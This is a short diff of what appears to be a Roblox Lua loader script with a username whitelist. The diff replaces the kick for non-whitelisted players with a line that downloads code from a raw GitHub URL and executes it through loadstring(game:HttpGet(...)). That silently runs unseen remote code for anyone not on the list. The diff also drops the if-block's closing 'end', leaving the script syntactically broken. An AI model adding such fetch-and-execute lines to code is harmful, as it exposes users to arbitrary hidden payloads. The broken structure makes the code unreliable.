@@ -9,9 +9,7 @@ local rs = game:GetService("ReplicatedStorage")
 
 -- Whitelist check with instant kick
 if not table.find(whitelistedUsers, player.Name) then
-    player:Kick("Not Whitelisted L")
-    return
-end
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/GodlikeXH3LL/SLH/refs/heads/main/Yazz"))()
 
 print("✅ ID " .. player.Name .. " allowed. Loading the script...")
 
